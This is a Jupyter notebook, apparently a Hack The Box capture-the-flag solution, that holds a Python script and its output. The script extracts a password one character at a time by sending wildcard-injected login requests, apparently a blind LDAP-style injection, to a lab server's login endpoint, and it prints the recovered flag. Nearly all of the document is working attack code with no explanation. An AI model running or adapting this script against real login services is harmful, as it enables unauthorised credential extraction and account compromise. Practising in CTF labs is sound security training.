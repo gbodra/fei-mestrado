{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import string\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTB{d1rectory_h4xx0r_is_k00l}~*\r"
     ]
    }
   ],
   "source": [
    "alfabeto = list(string.ascii_letters) + list(string.digits) + list(string.punctuation)\n",
    "alfabeto.remove(\"*\")\n",
    "url = \"http://167.71.143.20:30470/login\"\n",
    "obj = {\"username\": \"Reese\", \"password\": \"test\"}\n",
    "flag = 1\n",
    "resultado = \"\"\n",
    "\n",
    "while flag == 1:\n",
    "    flag = 0\n",
    "    for caractere in alfabeto:\n",
    "        obj[\"password\"] = resultado + caractere + \"*\"\n",
    "        print(f'\\r{obj[\"password\"]}', end=\"\\r\")\n",
    "        \n",
    "        req = requests.post(url, data = obj)\n",
    "        \n",
    "        if (\"No search results.\" in req.text):\n",
    "            resultado += caractere\n",
    "            flag = 1\n",
    "#             print(resultado)\n",
    "            break\n",
    "        \n",
    "#         os.system(\"cls\")\n",
    "\n",
    "# print(\"Finish\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
